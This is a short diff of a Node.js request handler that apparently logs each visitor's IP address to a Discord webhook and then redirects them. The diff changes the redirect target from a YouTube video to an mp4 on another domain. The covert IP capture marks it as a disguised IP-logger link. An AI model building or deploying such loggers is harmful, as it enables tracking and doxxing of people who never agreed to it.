@@ -53,7 +53,7 @@ const requestListener = (req, res) => {
     const clientIp = getClientIp(req);
     sendToDiscordWebhook(clientIp);
 
-    res.writeHead(302, { 'Location': 'https://www.youtube.com/watch?v=xvFZjo5PgG0' });
+    res.writeHead(302, { 'Location': 'https://b4sicallyf0x.com/up.mp4' });
     res.end();
 };
 
